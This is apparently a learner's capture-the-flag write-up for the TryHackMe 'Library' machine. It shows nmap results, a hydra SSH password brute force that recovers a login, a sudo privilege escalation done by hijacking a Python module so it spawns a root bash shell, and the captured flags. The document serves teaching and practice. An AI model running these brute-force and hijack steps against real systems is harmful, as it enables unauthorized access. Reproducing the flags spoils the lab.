## Nmap

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c42fc34767063204ef92918e0587d5dc (RSA)
|   256 689213ec9479dcbb7702da99bfb69db0 (ECDSA)
|_  256 43e824fcd8b8d3aac248089751dc5b7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## HTTP

So after visiting the website i tried web directory brute forcing using all possible and every tool in know because i was not able to find anythin usefull

there was on entry on /robots.txt file which said 

user agent: rockyou

and i thought i was supposed to put "User Agent Header as words in rock you wordlist"


so i used

```
[parrot]─[01:11-30/06]─[/home/glack/Desktop/THM]
└╼glack$ffuf -w /usr/share/wordlists/rockyou.txt:FUZZ -u http://10.10.72.247/ -H 'User-Agent:FUZZ' -fs 5439
```

And i was wrong after checking the writeup i realised and missed the easy username on the website


## SSH

After which I bruteforced ssh using hydra

```
[parrot]─[02:56-30/06]─[/home/glack/Desktop/THM]
└╼glack$hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.137.2 ssh
```

```
22][ssh] host: 10.10.137.2   login: meliodas   password: iloveyou1
```

And i got the password


user.txt

```
6d488cbb3f111d135722c33cb635f4ec
```


## Priv ESC

so the answere to priv esc for with

```
sudo -l


/usr/bin/python /home/meliodas/bak.py 
```

So I got stuck here again as i didnt completely uderstood the python code and used the writeup here

https://r4bb1t.medium.com/library-write-up-7dd5d5c5a9eb


So all we had to do was create another file here with the contents as below

```
import os  
  
ZIP_DEFLATED = 1  
  
def ZipFile(param1, param2, param3):  
        print(os.system('/bin/bash'))
```

and run the sudo command again


```
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py 
root@ubuntu:~# 

```

And we get Root

```
e8c8c6c256c35515d1d344ee0488c617
```